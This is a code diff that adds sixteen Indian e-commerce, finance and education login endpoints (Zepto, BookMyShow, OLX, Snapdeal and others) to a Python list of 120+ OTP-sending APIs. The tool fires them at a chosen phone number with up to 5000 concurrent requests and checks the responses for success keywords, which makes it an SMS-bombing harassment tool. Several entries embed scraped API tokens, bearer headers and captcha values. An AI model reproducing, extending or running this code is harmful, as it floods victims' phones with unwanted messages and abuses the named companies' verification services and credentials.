@@ -45,8 +45,8 @@ app.add_middleware(
 # ═══════════════════════════════════════════════════════════
 MAX_CONCURRENT  = 5000
 BATCH_CHUNK     = 1000
-REQUEST_TIMEOUT = 4
-CONNECT_TIMEOUT = 2
+REQUEST_TIMEOUT = 9
+CONNECT_TIMEOUT = 10
 
 OTP_KEYWORDS = (
     "success", "sent", "otp", "message", "ok", "true",
@@ -63,7 +63,228 @@ _global_stats = defaultdict(lambda: {
 # 📋 ALL APIS (Old + 16 New) — 120+ ENDPOINTS
 # ═══════════════════════════════════════════════════════════
 ULTIMATE_APIS = [
+    
     # ══════════════ NEW APIS ADDED (Based on User Request) ══════════════
+      {
+        "name": "zestmoney",
+        "url": "https://authentication.zestmoney.in/v2/mobile/otp/",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json",
+            "token": "135b043150475d7288b936606e086af5c1fb7f0eff15256748f5ad078ebdcf85",
+            "Origin": "https://app.zestmoney.in",
+            "Referer": "https://app.zestmoney.in/"
+        },
+        "data": lambda p: f'{{"MobileNumber":"91{p}","MessageParams":{{"MerchantKey":"null"}}}}'
+    },
+    {
+        "name": "bewakoof",
+        "url": "https://api-prod.bewakoof.com/v3/user/auth/login/otp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "api-token": "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk",
+            "x-client-device-token": "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk",
+            "x-origin-host": "api-prod.bewakoof.com/v3/user/auth/login/otp",
+            "Origin": "https://www.bewakoof.com",
+            "Referer": "https://www.bewakoof.com/"
+        },
+        "data": lambda p: f'{{"mobile":"{p}","country_code":"+91"}}'
+    },
+    {
+        "name": "eurekaforbes",
+        "url": "https://www.eurekaforbes.com/api/public/ecom/v1/otp/send",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0 Mobile Safari/537.36",
+            "Content-Type": "application/json"
+        },
+        "data": lambda p: f'{{"mobile_number":"{p}"}}'
+    },
+    {
+        "name": "bookmyshow",
+        "url": "https://in.bookmyshow.com/api/members/otp/send",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "x-app-code": "WEBV2",
+            "x-geohash": "te7",
+            "x-region-slug": "mumbai",
+            "x-latitude": "19.12175",
+            "x-longitude": "72.8504",
+            "x-platform-code": "WEBV2",
+            "x-region-code": "MUMBAI",
+            "Origin": "https://in.bookmyshow.com",
+            "Referer": "https://in.bookmyshow.com/login/otp?referer=/my-profile&refresh=true&source=web"
+        },
+        "data": lambda p: f'{{"channel":"phone","subChannel":"sms","details":{{"phone":"{p}","origin":"https://in.bookmyshow.com","isdCountryCode":"IN","isdCode":"+91"}}}}'
+    },
+    {
+        "name": "pharmeasy_apt",
+        "url": "https://pharmeasy.in/apt-api/login/send-otp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "Origin": "https://pharmeasy.in",
+            "Referer": "https://pharmeasy.in/"
+        },
+        "data": lambda p: f'{{"param":"{p}"}}'
+    },
+    {
+        "name": "dailyhunt",
+        "url": "https://dailyhunt.in/api/pwa",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "Origin": "https://dailyhunt.in",
+            "Referer": "https://dailyhunt.in/news/india/english/login/mobile-verification?mode=pwa&onlyLogin=true"
+        },
+        "data": lambda p: f'{{"method":"POST","body":{{"mobileNo":"91-{p}"}},"url":"http://dh-ugc-users.dailyhunt.in//api/v1/internal/pwa/accounts/generate/otp"}}'
+    },
+    {
+        "name": "cordelia",
+        "url": "https://api-pro.cordeliacruises.com/auth/b2c/generate-otp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json",
+            "Origin": "https://www.cordeliacruises.com",
+            "Referer": "https://www.cordeliacruises.com/"
+        },
+        "data": lambda p: f'{{"phoneNumber":"{p}","countryCode":"+91","website":"https://www.cordeliacruises.com/login","pageCode":"login"}}'
+    },
+    {
+        "name": "urbanladder",
+        "url": "https://www.urbanladder.com/api/service/application/user/authentication/v1.0/login/otp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json",
+            "authorization": "Bearer NjVmNDM3ZmFlNzg4NTEwMjg3MDdkYWVlOmI0ZEZvd2ZRSw==",
+            "Origin": "https://www.urbanladder.com",
+            "Referer": "https://www.urbanladder.com/auth/login"
+        },
+        "data": lambda p: f'{{"mobile":"{p}","country_code":"91","captcha_code":"grimlock_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0IjoxNzY5NDQwNTQyNjAyfQ.4sY-nJ89czQEY0MYp2hT1sRH0ADY9c1LE-AuC-hIHbY"}}'
+    },
+    {
+        "name": "mamaearth_gokwik",
+        "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc2OTUyNjQ3MSwiZXhwIjoxNzY5NTI2NTMxfQ.HLM1KyRImw0paDZMBYkFdm-6E1pQco_GitAdrUqrgy8",
+            "gk-request-id": "51c1169f-3c41-4b75-ac29-47e1e3b9d25d",
+            "kp-request-id": "ad5d18a8-824f-4a47-a5cf-6f732151c2dc",
+            "gk-merchant-id": "12wyqc26spoknx0kv7t",
+            "Origin": "https://mamaearth.in",
+            "Referer": "https://mamaearth.in/"
+        },
+        "data": lambda p: f'{{"phone":"{p}","country":"in","country_code":"+91"}}'
+    },
+    {
+        "name": "allen",
+        "url": "https://api.allen-live.in/api/v1/auth/sendOtp?center_id&source=home-page-login",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json",
+            "x-device-id": "29eeb510-774d-47e6-9606-19142305f562",
+            "x-client-type": "mweb",
+            "Origin": "https://allen.in",
+            "Referer": "https://allen.in/"
+        },
+        "data": lambda p: f'{{"country_code":"91","phone_number":"{p}","persona_type":"STUDENT","otp_type":"SHARED_DEFAULT"}}'
+    },
+    {
+        "name": "snapdeal",
+        "url": "https://m.snapdeal.com/signupCompleteAjax",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json;charset=UTF-8",
+            "Origin": "https://m.snapdeal.com",
+            "Referer": "https://m.snapdeal.com/signin"
+        },
+        "data": lambda p: f'{{"j_password":null,"j_mobilenumber":"{p}","agree":true,"j_confpassword":null,"journey":"mobile","numberEdit":false,"j_fullname":"Guest","swp":true}}'
+    },
+    {
+        "name": "fabindia",
+        "url": "https://apisap.fabindia.com/occ/v2/fabindiab2c/otp/generate?lang=en&curr=INR",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "authorization": "bearer yYo1wwUV1B1yUqYeo4YrbKF5WNI",
+            "Origin": "https://www.fabindia.com",
+            "Referer": "https://www.fabindia.com/"
+        },
+        "data": lambda p: f'{{"mobileDailCode":"+91","mobileNumber":"{p}","isLogin":false,"isSignUp":false}}'
+    },
+    {
+        "name": "shoppersstop",
+        "url": "https://api-sscom-preprod.ssecom.tech/v2/olg/sendOTP",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json",
+            "Origin": "https://www.shoppersstop.com",
+            "Referer": "https://www.shoppersstop.com/"
+        },
+        "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'
+    },
+    {
+        "name": "olx",
+        "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json",
+            "x-panamera-client-id": "web-mobile",
+            "Origin": "https://www.olx.in",
+            "Referer": "https://www.olx.in/en-in"
+        },
+        "data": lambda p: f'{{"grantType":"phone","phone":"+91{p}","language":"en-IN"}}'
+    },
+    {
+        "name": "zepto_v2",
+        "url": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json; charset=UTF-8",
+            "x-csrf-secret": "uD0aoNYI_ZA",
+            "platform": "WEB",
+            "Origin": "https://www.zepto.com",
+            "Referer": "https://www.zepto.com/"
+        },
+        "data": lambda p: f'{{"mobileNumber":"{p}"}}'
+    },
+    {
+        "name": "aakash",
+        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json",
+            "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763",
+            "Origin": "https://www.aakash.ac.in",
+            "Referer": "https://www.aakash.ac.in/"
+        },
+        "data": lambda p: f'{{"mobile_psid":"{p}","mobile_number":"","activity_type":"aakash-myadmission","webengageData":{{"profile":"student","whatsapp_opt_in":true,"method":"mobile"}}}}'
+    },
     {
         "name": "myntra_gateway",
         "url": "https://www.myntra.com/gateway/v1/auth/getotp",
